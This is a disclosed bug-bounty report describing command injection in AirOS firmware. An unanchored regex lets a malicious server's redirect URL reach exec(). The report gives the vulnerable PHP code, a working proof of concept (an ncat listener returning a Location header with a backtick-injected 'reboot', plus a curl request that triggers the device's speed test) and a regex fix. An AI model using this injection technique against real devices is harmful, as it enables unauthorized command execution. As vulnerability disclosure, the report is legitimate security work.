# Read-Only user can execute arbitraty shell commands on AirOS

## Report Details
- **Report ID**: 139398
- **URL**: https://hackerone.com/reports/139398
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-05-17T17:47:16.026Z
- **Disclosed**: 2016-08-05T09:36:57.491Z

## Reporter
- **Username**: rbran
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ui

## Vulnerability Information
This vulnerability is very similar to #128750, but it avoid the solution applied to the last beta XM firmware.

In this report is used the last beta XM firmware: `XM.v6.0-beta9`

# Vulnerability
The vulnerability resides in the function `fetchCookies` file `remote.inc:117`. Just like last time is a non sanitization or verification of the server (remote) response.

```
		if ($res == -11) { #received the redirect
			# got redirect, will have to try new one (if that's login.cgi)
			$lcount = count($lines);
			if ($lcount > 0) {
				$new_url = $lines[$lcount - 1]; # the URL returned by the attacker have shell code injected
			}
			$rg_login = "(https?://$ip(:[[:digit:]]+)?)/login.cgi"; #regex don't property verify the URL, it allow string before and after the URL
			if (IsSet($new_url) && ereg($rg_login, $new_url, $regs)) {
				$retry = 1;
				$base_url = $regs[1];
				$url = $new_url; # URL with shell code is utilized
			}
		}
		#[[REMOVED CODE]]

		if ($retry != 0) {
			$full_cmd = "$cmd_trigger -p $url"; # URL with shell code is injected
			exec($full_cmd, $lines, $res); # shell code executed
			$res = getRetVal($res);
		}

		}
```

# Proof-of-concept
First we (attacker) need to initialize a local server to make the redirect to the victim, in this example the attacker ip is `192.168.1.100`:
```
echo -en "HTTP/1.1 302 Found\r\nLocation: https://192.168.1.100/login.cgi `reboot`\r\nContent-Length: 0\r\n\r\n" | ncat -lp 8080
```

So you need to run a speed test against the attacker host, with can be done using the Web interface `https://192.168.1.20/sptest.cgi`, or by the following command (making the required adjusts):
```
curl 'https://192.168.1.20/sptest_action.cgi?ticket=507&action=remote&target=192.168.1.100&port=8080&login=ignore&passwd=ignore&airosid=96ba18a3aa55ba4c6e1f8ab111a9fb8f&_=1463505340471' -H 'Cookie: AIROS_001122334455=96ba18a3aa55ba4c6e1f8ab111a9fb8f; ui_language=en_US; last_check=1463504970136' 
```

# Possible Solution
This bug can be solved using literally 2 character, the REGEX end `$` and begin `^`:
```
$rg_login = "^(https?://$ip(:[[:digit:]]+)?)/login.cgi$";
```

## Attachments
No attachments
